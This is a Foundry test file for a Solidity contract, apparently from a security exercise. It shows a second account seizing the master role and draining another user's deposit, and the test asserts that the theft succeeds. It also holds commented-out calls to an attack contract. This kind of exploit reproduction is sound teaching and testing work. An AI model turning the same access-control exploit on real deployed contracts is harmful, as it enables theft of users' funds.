// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;


import "lib/forge-std/src/Test.sol";
import "../src/Allocations.sol";
import "../src/TakeAllocations.sol";

contract AllocationsTest is Test {
    Allocations public allocations;
    TakeAllocations public attackAllocations;
    address alice;
    address bob;

    function setUp() public {
        allocations = new Allocations();
        attackAllocations = new TakeAllocations(address(allocations));
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        //address moscas = address(attackAllocations);
    }

    function testAllocations () public payable{
        vm.startPrank(alice);
        vm.deal(alice, 1*1e18);

        console.log("alice",alice.balance);
        allocations.allocate{value: 1*1e18}();
        console.log("alice",alice.balance);

        vm.stopPrank();

        vm.startPrank(bob);
        console.log("Bob", bob.balance);

        allocations.takeMasterRole();
        allocations.collectAllocations();
        //(bool success, ) = address(takeAllocations).delegatecall(abi.encodeWithSignature("attack()"));
        //attackAllocations.attack();
        assertEq(bob.balance, 1e18);
        console.log("Bob", bob.balance);
    }  
}
